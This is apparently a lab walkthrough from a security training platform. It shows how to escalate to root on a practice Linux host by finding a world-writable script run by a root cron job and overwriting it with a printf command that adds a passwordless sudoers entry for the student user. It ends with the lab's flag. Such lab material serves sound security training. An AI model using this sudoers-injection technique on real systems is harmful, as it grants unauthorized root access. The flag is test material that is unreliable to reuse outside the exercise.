Cron is a lifesaver for admins when it comes to doing periodic maintenance tasks on the system. They can even be used in cases where tasks are performed within individual user directories. However, such automations need to be used with caution or can lead to easy privilege escalation attacks.

# Lab Environment

In this lab environment, you will be provided with GUI access to a Kali machine. A terminal access to the target machine is provided at target.ine.local:8000, which you can access over the browser in Kali.

**Objective:** Your mission is to get a root shell on the box and retrieve the flag!

# Tools

The best tools for this lab are:

- Nmap
- Browser(Firefox)

**Step 1:** Access the Kali Machine

![Content Image](https://assets.ine.com/lab/skilldive/052b149e543394964d3bca77a41d1be5865ae54b292978a03523d6d795db8c23.png)

**Step 2:** Check Target Reachability

**Command:**

```
ping -c4 target.ine.local
```

![Content Image](https://assets.ine.com/lab/skilldive/e61bd7b28b934f28bfec7cc358ef380a81363d586846a2327ef2acd86c0259ba.png)

The target is reachable.

**Step 3:** Access the Exposed Service

Open a browser and navigate to the following URL to explore the service running on port 8000:

[http://target.ine.local:8000]

![Content Image](https://assets.ine.com/lab/skilldive/f996d2fb36e438f8c9d500d5fe1a64e0934921613a74c41abd8bc28c33da57e5.png)

You should now see the Linux terminal interface running, confirming that the service is live and accessible.

**Step 4:** There is a **message** file in the home directory of student user. Only root user has permissions on this file. So, student user can’t even read it.

**Command:**

```
ls -l
```

![Content Image](https://assets.ine.com/lab/skilldive/e7ee02ffa66bd0e3160c4860a3f1c871915682ed9584c91d51bbf8de6c9947b0.png)

**Step 5:** Find if a file with the same name exists on the system.

**Command:**

```
find / -name message
```

![Content Image](https://assets.ine.com/lab/skilldive/cff678209691969df0dfd1ea61d3bd8e50fca9c58982acc435cf7851b84919fd.png)

**Step 6:** Observe that a file with the same name is present in the **/tmp** directory. On checking closely, it is clear that this file is being overwritten every minute.

**Command:**

```
ls -l /tmp/
```

![Content Image](https://assets.ine.com/lab/skilldive/87c229d1ba5bde24ec00d780020ad995c784243c847d9cf12fe2cfca31214773.png)

**Step 7:** This means there is some script/binary which is copying this file from the student **home** directory to **/tmp** directory. Search for that script. If this script is doing a simple copy operation, it must have the source destination of the file in it. Try to locate that by using the grep command. On trying on different directories one by one (i.e. /, etc, /opt) and on /usr directory, a match has been found.

**Command:**

```
grep -nri "/tmp/message" /usr
```

![Content Image](https://assets.ine.com/lab/skilldive/a7a7e8eed2c382f9495245b96c738e6811d336a9becbe66a4de5cc12890098fb.png)

**Step 8:** Check the permissions on this script file and its contents.

**Commands:**

```
ls -l /usr/local/share/copy.sh
cat /usr/local/share/copy.sh
```

![Content Image](https://assets.ine.com/lab/skilldive/b320b696ff5c2c6d165825101f2306a67b5af9e54ef3e704e11e5d57c250a3cd.png)

**Step 9:** As the script file is writable by the current **student** user, it can be modified to execute our commands. This script is executed by root cron job, so it can do privileged operations.

But, the file can’t be modified directly as there is no text editor on the system.

**Commands:**

```
vim /usr/local/share/copy.sh
vi /usr/local/share/copy.sh
nano /usr/local/share/copy.sh
```

![Content Image](https://assets.ine.com/lab/skilldive/8298292f93b972eb9cf2b47b2da7bc4687c4c5bdda4e9c2420c791af55066324.png)

**Step 10:** Use printf to replace the original code with the following lines.

**Code:**

```
printf '#! /bin/bash\necho "student ALL=NOPASSWD:ALL" >> /etc/sudoers' > /usr/local/share/copy.sh
```

On execution, these lines will add a new entry to the **/etc/sudoers** file which will allow the student user to use sudo without providing any password.

**Command:**

```
cat /usr/local/share/copy.sh
```

![Content Image](https://assets.ine.com/lab/skilldive/e54b7c9056b88d22e8fb0de23a50cbaffa4b58a85ba3b73c8c4e8aeabb8aa1a9.png)

**Step 11:** Check the current sudoers list.

**Command:**

```
sudo -l
```

**Note:** You might have to wait for 1 minute (i.e. the cron job runs every 1 minute) and check the sudoers list again. This time new entry is there.

![Content Image](https://assets.ine.com/lab/skilldive/8407e0e2950306592c82a8487665b768915be16005854bb9791c59085364d3af.png)

**Step 12:** Switch to the root user using **sudo**.

**Command:**

```
sudo su
```

![Content Image](https://assets.ine.com/lab/skilldive/d2c48f37b97b7a00a2a1d3ebc41ca9674f4c59a099b2046908b791c1a445a101.png)

**Step 13:** Collect the **flag** from the root directory.

**Commands:**

```
cd /root
ls -l
cat flag
```

![Content Image](https://assets.ine.com/lab/skilldive/56712616dba6eb9287e5d21c475f69e19bba93d9207e6498eb8baeb030d74597.png)

### Flag: 697914df7a07bb9b718c8ed258150164